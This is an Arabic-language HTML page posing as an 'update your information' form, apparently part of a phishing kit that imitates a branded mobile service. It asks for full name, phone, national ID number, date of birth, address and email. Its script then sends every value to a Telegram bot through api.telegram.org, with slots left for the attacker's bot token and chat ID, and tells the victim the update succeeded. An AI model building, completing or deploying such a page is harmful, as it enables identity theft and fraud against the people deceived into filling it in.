<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>تحديث المعلومات</title>
<style>
body {
font-family: Arial, sans-serif;
margin: 0;
padding: 0;
direction: rtl;
background: #fff;
color: #000;
}
/* البار العلوي */
.top-bar {
background: #2b2e36; /* نفس الدرجة الظاهرة بالصورة */
color: #fff;
padding: 15px;
font-size: 18px;
text-align: center;
position: relative;
}
.top-bar::after {
content: "";
display: block;
height: 3px;
background: #ff5a00; /* البرتقالي */
position: absolute;
bottom: 0;
left: 0;
right: 0;
}
.back-btn {
position: absolute;
right: 10px;
top: 50%;
transform: translateY(-50%);
font-size: 22px;
color: #fff;
text-decoration: none;
}
.container {
padding: 20px;
}
h2 {
text-align: center;
margin: 25px 0;
font-size: 22px;
}
label {
display: block;
margin: 10px 0 5px;
font-size: 15px;
}
input {
width: 100%;
padding: 12px;
margin-bottom: 15px;
border: none;
border-bottom: 1px solid #ccc;
font-size: 16px;
outline: none;
}
.btn {
width: 100%;
padding: 18px;
background: #ff5a00;
border: none;
color: #fff;
font-size: 18px;
position: fixed;
bottom: 0;
left: 0;
cursor: not-allowed;
}
.btn.active {
cursor: pointer;
background: #e44a00;
}
</style>
</head>
<body>

<div class="top-bar">
تحديث المعلومات
<a href="verethad.html" class="back-btn">➔</a>
</div>

<div class="container">
<h2>أدخل المعلومات</h2>
<form id="infoForm">
<label>الاسم بالكامل</label>
<input type="text" id="name" placeholder="أدخل الاسم بالكامل" required>

<label>رقم الهاتف</label>
<input type="tel" id="phone" placeholder="أدخل رقم الهاتف" required>

<label>الرقم الوطني</label>
<input type="text" id="nationalId" placeholder="أدخل الرقم الوطني" required>

<label>تاريخ الميلاد</label>
<input type="date" id="dob" required>

<label>العنوان</label>
<input type="text" id="address" placeholder="أدخل العنوان" required>

<label>البريد الإلكتروني</label>
<input type="email" id="email" placeholder="أدخل البريد الإلكتروني" required>

<button type="submit" id="submitBtn" class="btn">التالي</button>
</form>
</div>

<script>
const form = document.getElementById('infoForm');
const btn = document.getElementById('submitBtn');
const inputs = form.querySelectorAll('input');

// تفعيل زر التالي بعد تعبئة جميع الحقول
inputs.forEach(input => {
input.addEventListener('input', () => {
let allFilled = true;
inputs.forEach(i => {
if (!i.value) allFilled = false;
});
if (allFilled) {
btn.classList.add('active');
btn.removeAttribute('disabled');
btn.style.cursor = "pointer";
} else {
btn.classList.remove('active');
btn.setAttribute('disabled', true);
btn.style.cursor = "not-allowed";
}
});
});

// إرسال البيانات إلى تلجرام
form.addEventListener('submit', function(e){
e.preventDefault();

const data = {
name: document.getElementById('name').value,
phone: document.getElementById('phone').value,
nationalId: document.getElementById('nationalId').value,
dob: document.getElementById('dob').value,
address: document.getElementById('address').value,
email: document.getElementById('email').value
};

const botToken = "ضع_توكن_البوت_هنا";
const chatId = "ضع_ChatID_هنا";
const text =
`📋 تحديث المعلومات:\n` +
`👤 الاسم: ${data.name}\n` +
`📞 الهاتف: ${data.phone}\n` +
`🆔 الرقم الوطني: ${data.nationalId}\n` +
`🎂 تاريخ الميلاد: ${data.dob}\n` +
`🏠 العنوان: ${data.address}\n` +
`📧 البريد الإلكتروني: ${data.email}`;

fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
method: "POST",
headers: {"Content-Type": "application/json"},
body: JSON.stringify({
chat_id: chatId,
text: text
})
}).then(res => {
alert("تم إرسال المعلومات بنجاح ✅");
}).catch(err => {
alert("حدث خطأ في الإرسال ❌");
});
});
</script>

</body>
</html>
